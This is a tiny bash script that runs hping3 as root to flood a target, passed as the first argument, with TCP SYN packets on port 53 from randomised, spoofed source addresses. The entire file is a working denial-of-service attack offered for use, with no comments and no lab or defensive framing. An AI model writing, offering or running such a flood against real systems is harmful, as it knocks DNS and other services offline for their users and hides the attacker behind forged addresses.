#!/bin/bash
sudo hping3 -S -V --flood -p 53 "$1" --rand-source
